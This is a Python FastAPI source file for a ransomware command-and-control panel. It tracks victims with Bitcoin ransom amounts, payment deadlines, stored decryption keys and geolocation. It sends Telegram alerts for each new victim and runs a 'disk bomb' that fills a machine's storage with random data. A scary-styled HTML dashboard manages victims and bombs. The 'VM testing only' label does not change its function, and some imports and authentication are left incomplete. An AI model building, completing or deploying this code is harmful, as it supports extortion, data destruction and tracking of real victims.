#!/usr/bin/env python3
"""
PUSS CONTROL PANEL - Complete System
FOR VM TESTING ONLY
"""

import os
import sys
import json
import time
import random
import hashlib
import hmac
import secrets
import threading
import socket
import uuid
import subprocess
import logging
import platform
from datetime import datetime, timedelta
from typing import Optional, Dict, Any, List
from contextlib import asynccontextmanager
from fastapi import FastAPI, Request, Response, HTTPException, status, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse, FileResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from pydantic import BaseModel, Field
import requests
import uvicorn

# ============================================================================
# CONFIGURATION
# ============================================================================

class Config:
    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD')
    ADMIN_EMAIL = os.environ.get('ADMIN_EMAIL')
    BTC_WALLET = os.environ.get('BTC_WALLET')
    RANSOM_AMOUNT = os.environ.get('RANSOM_AMOUNT', '0.5')
    SERVER_URL = os.environ.get('SERVER_URL')
    TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
    TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
    SECRET_KEY = os.environ.get('SECRET_KEY', secrets.token_hex(32))
    ENVIRONMENT = os.environ.get('ENVIRONMENT', 'production')
    LOG_LEVEL = os.environ.get('LOG_LEVEL', 'WARNING')

# ============================================================================
# LOGGING
# ============================================================================

logging.basicConfig(
    level=getattr(logging, Config.LOG_LEVEL),
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('system.log'), logging.StreamHandler()]
)
logger = logging.getLogger('puss_system')

# ============================================================================
# TELEGRAM
# ============================================================================

class TelegramService:
    def __init__(self, token: str, chat_id: str):
        self.token = token
        self.chat_id = chat_id
        self.enabled = bool(token and chat_id)
        self.base_url = f"https://api.telegram.org/bot{token}"
    
    def send(self, text: str) -> bool:
        if not self.enabled:
            return False
        try:
            requests.post(f"{self.base_url}/sendMessage", json={
                'chat_id': self.chat_id,
                'text': text,
                'parse_mode': 'HTML'
            }, timeout=5)
            return True
        except:
            return False
    
    def notify_new(self, victim: Dict) -> None:
        if self.enabled:
            self.send(f"NEW VICTIM\nID: {victim['id']}\nLocation: {victim.get('city','Unknown')}")

telegram = TelegramService(Config.TELEGRAM_BOT_TOKEN, Config.TELEGRAM_CHAT_ID)

# ============================================================================
# DISK BOMB MANAGER
# ============================================================================

class DiskBombManager:
    def __init__(self):
        self.active_bombs = {}
        self.bomb_threads = {}
        self.ws_connections = {}
    
    def start_bomb(self, client_id: str, filename: str = "explosion.dat") -> bool:
        if client_id in self.active_bombs and self.active_bombs[client_id].get('running'):
            return False
        
        self.active_bombs[client_id] = {
            'running': True,
            'filename': filename,
            'start_time': datetime.now().isoformat(),
            'bytes_written': 0,
            'size_gb': 0,
            'status': 'running'
        }
        
        thread = threading.Thread(target=self._run_bomb, args=(client_id, filename))
        thread.daemon = True
        self.bomb_threads[client_id] = thread
        thread.start()
        return True
    
    def _run_bomb(self, client_id: str, filename: str):
        try:
            one_gb = 1073741824
            chunk = 1024 * 1024
            bytes_written = 0
            
            with open(filename, 'wb') as f:
                while self.active_bombs[client_id].get('running'):
                    for _ in range(one_gb // chunk):
                        if not self.active_bombs[client_id].get('running'):
                            break
                        f.write(os.urandom(chunk))
                        bytes_written += chunk
                        f.flush()
                        os.fsync(f.fileno())
                        
                        size = bytes_written / one_gb
                        self.active_bombs[client_id]['bytes_written'] = bytes_written
                        self.active_bombs[client_id]['size_gb'] = size
                        
                        self._send_update(client_id, {
                            'type': 'progress',
                            'size_gb': size,
                            'bytes': bytes_written
                        })
                    
                    time.sleep(1)
        except Exception as e:
            self.active_bombs[client_id]['status'] = f'error: {e}'
        finally:
            self.active_bombs[client_id]['running'] = False
    
    def stop_bomb(self, client_id: str) -> bool:
        if client_id in self.active_bombs:
            self.active_bombs[client_id]['running'] = False
            return True
        return False
    
    def get_status(self, client_id: str) -> Dict:
        return self.active_bombs.get(client_id, {'running': False})
    
    def register_ws(self, client_id: str, websocket):
        self.ws_connections[client_id] = websocket
    
    def _send_update(self, client_id: str, data: Dict):
        if client_id in self.ws_connections:
            try:
                import asyncio
                asyncio.create_task(self.ws_connections[client_id].send_json(data))
            except:
                pass

bomb_manager = DiskBombManager()

# ============================================================================
# DATABASE
# ============================================================================

class Database:
    def __init__(self, db_path: str = "data.json"):
        self.db_path = db_path
        self.victims: Dict[str, Dict] = {}
        self.logs: List[Dict] = []
        self.settings = {
            'ransom': Config.RANSOM_AMOUNT,
            'wallet': Config.BTC_WALLET,
            'window': 72
        }
        self._load()
    
    def _load(self):
        try:
            if os.path.exists(self.db_path):
                with open(self.db_path, 'r') as f:
                    data = json.load(f)
                    self.victims = data.get('victims', {})
                    self.logs = data.get('logs', [])
                    self.settings.update(data.get('settings', {}))
        except:
            pass
    
    def _save(self):
        with open(self.db_path, 'w') as f:
            json.dump({
                'victims': self.victims,
                'logs': self.logs[-500:],
                'settings': self.settings
            }, f, indent=2)
    
    def add_victim(self, victim_id: str, files: int = 0, hostname: str = "", 
                   ip: str = "", country: str = "", city: str = "", 
                   lat: float = 0, lon: float = 0, os_info: str = ""):
        from cryptography.fernet import Fernet
        key = Fernet.generate_key().decode()
        
        now = datetime.now()
        deadline = now + timedelta(hours=self.settings['window'])
        
        self.victims[victim_id] = {
            'id': victim_id,
            'files': files,
            'ransom': f"{self.settings['ransom']} BTC",
            'wallet': self.settings['wallet'],
            'status': 'unpaid',
            'deadline': deadline.isoformat(),
            'created': now.isoformat(),
            'key': key,
            'hostname': hostname or socket.gethostname(),
            'ip': ip or '0.0.0.0',
            'country': country or 'Unknown',
            'city': city or 'Unknown',
            'lat': lat,
            'lon': lon,
            'os': os_info or 'Unknown',
            'paid_at': None,
            'tx': None
        }
        self._save()
        self.log('info', f"New victim: {victim_id}")
        telegram.notify_new(self.victims[victim_id])
        return self.victims[victim_id]
    
    def get_victim(self, victim_id: str) -> Optional[Dict]:
        return self.victims.get(victim_id)
    
    def update_victim(self, victim_id: str, data: Dict) -> bool:
        if victim_id in self.victims:
            self.victims[victim_id].update(data)
            self._save()
            return True
        return False
    
    def verify_payment(self, victim_id: str, tx: str) -> bool:
        if victim_id in self.victims:
            self.victims[victim_id]['status'] = 'paid'
            self.victims[victim_id]['tx'] = tx
            self.victims[victim_id]['paid_at'] = datetime.now().isoformat()
            self._save()
            self.log('success', f"Payment for {victim_id}")
            return True
        return False
    
    def delete_victim(self, victim_id: str) -> bool:
        if victim_id in self.victims:
            del self.victims[victim_id]
            self._save()
            return True
        return False
    
    def get_all(self) -> Dict:
        return self.victims
    
    def get_stats(self) -> Dict:
        total = len(self.victims)
        paid = sum(1 for v in self.victims.values() if v.get('status') == 'paid')
        unpaid = total - paid
        return {
            'total': total,
            'paid': paid,
            'unpaid': unpaid,
            'bombs': len(bomb_manager.active_bombs),
            'btc': paid * float(self.settings['ransom'])
        }
    
    def log(self, level: str, msg: str):
        self.logs.append({
            'time': datetime.now().isoformat(),
            'level': level,
            'msg': msg
        })
        self._save()
        logger.info(f"[{level}] {msg}")

db = Database()

# ============================================================================
# AUTH
# ============================================================================

security = HTTPBasic()

def verify_owner(creds: HTTPBasicCredentials = Depends(security)):
    if not hmac.compare_digest(creds.password.encode(), Config.OWNER_PASSWORD.encode()):
        raise HTTPException(status_code=401)
    return creds.username

# ============================================================================
# FASTAPI APP
# ============================================================================

@asynccontextmanager
async def lifespan(app: FastAPI):
    logger.info("PUSS System Started")
    yield
    logger.info("Shutting down")

app = FastAPI(title="PUSS System", version="3.0", lifespan=lifespan, docs_url=None, redoc_url=None)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])

# ============================================================================
# WEBSOCKET
# ============================================================================

@app.websocket("/ws/{client_id}")
async def websocket_endpoint(websocket: WebSocket, client_id: str):
    await websocket.accept()
    bomb_manager.register_ws(client_id, websocket)
    try:
        while True:
            await websocket.receive_text()
    except:
        pass

# ============================================================================
# HTML TEMPLATES - 2000s SCARY STYLE
# ============================================================================

INDEX_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>SYSTEM</title>
    <meta charset="utf-8">
    <style>
        body {
            background: black;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
            cursor: crosshair;
        }
        
        .container {
            max-width: 900px;
            margin: 0 auto;
            border: 2px solid #ff0000;
            padding: 20px;
            background: #0a0a0a;
            box-shadow: 0 0 30px #ff0000;
        }
        
        .header {
            text-align: center;
            border-bottom: 1px solid #ff0000;
            padding: 10px;
            margin-bottom: 20px;
        }
        
        .header h1 {
            font-size: 40px;
            color: #ff0000;
            text-shadow: 0 0 10px #ff0000;
            margin: 0;
            animation: flicker 2s infinite;
        }
        
        @keyframes flicker {
            0% { opacity: 1; }
            50% { opacity: 0.8; }
            51% { opacity: 1; }
            60% { opacity: 0.9; }
            100% { opacity: 1; }
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        
        .stat {
            border: 1px solid #ff0000;
            padding: 15px;
            text-align: center;
            background: #1a0000;
        }
        
        .stat .value {
            font-size: 32px;
            font-weight: bold;
            color: #ff0000;
        }
        
        .stat .label {
            font-size: 12px;
            color: #ff6666;
        }
        
        .panel {
            border: 2px solid #ff0000;
            margin: 20px 0;
            padding: 15px;
            background: #1a1a1a;
        }
        
        .panel h3 {
            color: #ff0000;
            margin-top: 0;
            border-bottom: 1px solid #ff0000;
            padding-bottom: 5px;
        }
        
        input, select {
            background: black;
            border: 1px solid #ff0000;
            color: #00ff00;
            padding: 8px;
            font-family: 'Courier New', monospace;
            margin: 5px;
        }
        
        button {
            background: #ff0000;
            color: black;
            border: none;
            padding: 10px 20px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            cursor: pointer;
            margin: 5px;
        }
        
        button:hover {
            background: #ff6666;
            box-shadow: 0 0 20px #ff0000;
        }
        
        .danger {
            background: black;
            color: #ff0000;
            border: 1px solid #ff0000;
        }
        
        .danger:hover {
            background: #ff0000;
            color: black;
        }
        
        .table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .table th {
            background: #ff0000;
            color: black;
            padding: 8px;
        }
        
        .table td {
            border: 1px solid #ff0000;
            padding: 8px;
        }
        
        .status-paid {
            color: #00ff00;
        }
        
        .status-unpaid {
            color: #ff0000;
        }
        
        .progress {
            width: 100%;
            height: 20px;
            background: #1a1a1a;
            border: 1px solid #ff0000;
            margin: 10px 0;
        }
        
        .progress-fill {
            height: 100%;
            background: #ff0000;
            width: 0%;
            transition: width 0.3s;
        }
        
        .logs {
            height: 200px;
            overflow-y: auto;
            background: black;
            border: 1px solid #ff0000;
            padding: 10px;
            font-size: 12px;
        }
        
        .blink {
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }
        
        .ascii {
            color: #ff0000;
            font-size: 10px;
            white-space: pre;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⛓️ SYSTEM LOCK ⛓️</h1>
            <div class="ascii">
                /\\____/\\    /\\____/\\
                (  o  o )  (  o  o )
                (   ==   )(   ==   )
                (         )(         )
                (  )  (  )(  )  (  )
            </div>
        </div>
        
        <div class="stats" id="stats">
            <div class="stat"><div class="value">-</div><div class="label">VICTIMS</div></div>
            <div class="stat"><div class="value">-</div><div class="label">PAID</div></div>
            <div class="stat"><div class="value">-</div><div class="label">UNPAID</div></div>
            <div class="stat"><div class="value">-</div><div class="label">BOMBS</div></div>
        </div>
        
        <div class="panel">
            <h3>💣 DISK BOMB CONTROL</h3>
            <div>
                <input type="text" id="bomb_client" placeholder="Client ID">
                <input type="text" id="bomb_file" placeholder="Filename" value="explosion.dat">
                <button onclick="startBomb()">[ START BOMB ]</button>
                <button class="danger" onclick="stopBomb()">[ STOP BOMB ]</button>
                <button onclick="checkBomb()">[ STATUS ]</button>
            </div>
            <div id="bomb_status"></div>
            <div class="progress" id="bomb_progress" style="display:none;">
                <div class="progress-fill" id="bomb_fill"></div>
            </div>
        </div>
        
        <div class="panel">
            <h3>📋 VICTIMS</h3>
            <div style="margin-bottom:10px;">
                <input type="text" id="victim_id" placeholder="Victim ID">
                <button onclick="getVictim()">[ GET ]</button>
                <button onclick="deleteVictim()" class="danger">[ DELETE ]</button>
            </div>
            <div id="victim_info"></div>
        </div>
        
        <div class="panel">
            <h3>📊 ALL VICTIMS</h3>
            <table class="table" id="victims_table">
                <tr><th>ID</th><th>FILES</th><th>LOCATION</th><th>STATUS</th></tr>
            </table>
        </div>
        
        <div class="panel">
            <h3>📝 SYSTEM LOGS</h3>
            <div class="logs" id="logs"></div>
        </div>
        
        <div style="text-align:center; margin-top:20px; color:#666;">
            <span class="blink">></span> SYSTEM ACTIVE <span class="blink"><</span>
        </div>
    </div>

    <script>
        let ws = null;
        
        async function loadStats() {
            const r = await fetch('/api/stats');
            const s = await r.json();
            document.getElementById('stats').innerHTML = `
                <div class="stat"><div class="value">${s.total}</div><div class="label">VICTIMS</div></div>
                <div class="stat"><div class="value">${s.paid}</div><div class="label">PAID</div></div>
                <div class="stat"><div class="value">${s.unpaid}</div><div class="label">UNPAID</div></div>
                <div class="stat"><div class="value">${s.bombs}</div><div class="label">BOMBS</div></div>
            `;
        }
        
        async function loadVictims() {
            const r = await fetch('/api/victims');
            const v = await r.json();
            let html = '<tr><th>ID</th><th>FILES</th><th>LOCATION</th><th>STATUS</th></tr>';
            for (const [id, data] of Object.entries(v)) {
                html += `<tr>
                    <td>${id}</td>
                    <td>${data.files}</td>
                    <td>${data.city}, ${data.country}</td>
                    <td class="status-${data.status}">${data.status}</td>
                </tr>`;
            }
            document.getElementById('victims_table').innerHTML = html;
        }
        
        async function loadLogs() {
            const r = await fetch('/api/logs');
            const l = await r.json();
            let html = '';
            l.slice(-20).forEach(log => {
                html += `<div>[${log.time.slice(11,19)}] ${log.level}: ${log.msg}</div>`;
            });
            document.getElementById('logs').innerHTML = html;
        }
        
        function connectWS(client) {
            if (ws) ws.close();
            const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            ws = new WebSocket(`${proto}//${window.location.host}/ws/${client}`);
            ws.onmessage = (e) => {
                const d = JSON.parse(e.data);
                if (d.type === 'progress') {
                    document.getElementById('bomb_progress').style.display = 'block';
                    document.getElementById('bomb_fill').style.width = `${Math.min(d.size_gb, 100)}%`;
                    document.getElementById('bomb_status').innerHTML = 
                        `<div>Size: ${d.size_gb.toFixed(2)} GB</div>`;
                }
            };
        }
        
        async function startBomb() {
            const client = document.getElementById('bomb_client').value;
            const file = document.getElementById('bomb_file').value;
            if (!client) return alert('Enter Client ID');
            connectWS(client);
            const r = await fetch('/api/bomb/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: client, filename: file})
            });
            const d = await r.json();
            if (d.success) alert('Bomb started');
        }
        
        async function stopBomb() {
            const client = document.getElementById('bomb_client').value;
            const r = await fetch('/api/bomb/stop', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: client})
            });
            const d = await r.json();
            if (d.success) {
                alert('Bomb stopped');
                document.getElementById('bomb_progress').style.display = 'none';
            }
        }
        
        async function checkBomb() {
            const client = document.getElementById('bomb_client').value;
            const r = await fetch(`/api/bomb/status/${client}`);
            const d = await r.json();
            if (d.running) {
                document.getElementById('bomb_status').innerHTML = 
                    `Running: ${d.size_gb.toFixed(2)} GB`;
            } else {
                document.getElementById('bomb_status').innerHTML = 'No active bomb';
            }
        }
        
        async function getVictim() {
            const id = document.getElementById('victim_id').value;
            const r = await fetch(`/api/victim/${id}`);
            if (r.status === 200) {
                const v = await r.json();
                document.getElementById('victim_info').innerHTML = `
                    ID: ${v.id}<br>
                    Files: ${v.files}<br>
                    Location: ${v.city}, ${v.country}<br>
                    Status: ${v.status}<br>
                    Deadline: ${v.deadline.slice(0,10)}<br>
                    ${v.status === 'paid' ? 'Key: ' + v.key : ''}
                `;
            } else {
                document.getElementById('victim_info').innerHTML = 'Not found';
            }
        }
        
        async function deleteVictim() {
            const id = document.getElementById('victim_id').value;
            if (!id) return;
            if (confirm('Delete ' + id + '?')) {
                await fetch(`/api/victim/${id}`, {method: 'DELETE'});
                loadVictims();
            }
        }
        
        setInterval(() => {
            loadStats();
            loadVictims();
            loadLogs();
        }, 3000);
        
        loadStats();
        loadVictims();
        loadLogs();
    </script>
</body>
</html>
"""

# ============================================================================
# API ROUTES
# ============================================================================

@app.get('/', response_class=HTMLResponse)
async def index():
    return INDEX_HTML

@app.get('/api/stats')
async def get_stats():
    return db.get_stats()

@app.get('/api/logs')
async def get_logs(limit: int = 50):
    return db.logs[-limit:]

@app.get('/api/victims')
async def get_victims():
    return db.get_all()

@app.get('/api/victim/{vid}')
async def get_victim(vid: str):
    v = db.get_victim(vid)
    if not v:
        raise HTTPException(404)
    return v

@app.post('/api/add-victim')
async def add_victim(req: Request):
    data = await req.json()
    v = db.add_victim(
        victim_id=data.get('victim_id'),
        files=data.get('files', 0),
        hostname=data.get('hostname'),
        ip=data.get('ip'),
        country=data.get('country'),
        city=data.get('city'),
        lat=data.get('lat', 0),
        lon=data.get('lon', 0),
        os_info=data.get('os')
    )
    return v

@app.post('/api/update-victim')
async def update_victim(req: Request):
    data = await req.json()
    success = db.update_victim(data.get('victim_id'), {'files': data.get('files_encrypted')})
    return {'success': success}

@app.post('/api/verify-payment')
async def verify_payment(req: Request):
    data = await req.json()
    success = db.verify_payment(data.get('victim_id'), data.get('tx_id'))
    return {'success': success}

@app.delete('/api/victim/{vid}')
async def delete_victim(vid: str):
    success = db.delete_victim(vid)
    return {'success': success}

# ============================================================================
# BOMB API
# ============================================================================

class BombStart(BaseModel):
    client_id: str
    filename: str = "explosion.dat"

class BombStop(BaseModel):
    client_id: str

@app.post('/api/bomb/start')
async def bomb_start(bomb: BombStart):
    success = bomb_manager.start_bomb(bomb.client_id, bomb.filename)
    if success:
        db.log('info', f"Bomb started: {bomb.client_id}")
    return {'success': success}

@app.post('/api/bomb/stop')
async def bomb_stop(bomb: BombStop):
    success = bomb_manager.stop_bomb(bomb.client_id)
    if success:
        db.log('info', f"Bomb stopped: {bomb.client_id}")
    return {'success': success}

@app.get('/api/bomb/status/{client_id}')
async def bomb_status(client_id: str):
    return bomb_manager.get_status(client_id)

# ============================================================================
# OWNER API (Protected)
# ============================================================================

@app.post('/api/owner/login')
async def owner_login(req: Request):
    data = await req.json()
    success = data.get('password') == Config.OWNER_PASSWORD
    return {'success': success}

# ============================================================================
# HEALTH
# ============================================================================

@app.get('/health')
async def health():
    return {
        'status': 'ok',
        'time': datetime.now().isoformat(),
        'victims': len(db.victims),
        'bombs': len(bomb_manager.active_bombs)
    }

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 8000))
    logger.info("="*50)
    logger.info("PUSS SYSTEM v3.0")
    logger.info(f"Port: {port}")
    logger.info(f"Victims: {len(db.victims)}")
    logger.info(f"Telegram: {'ON' if telegram.enabled else 'OFF'}")
    logger.info("="*50)
    uvicorn.run("main:app", host="0.0.0.0", port=port, reload=False)
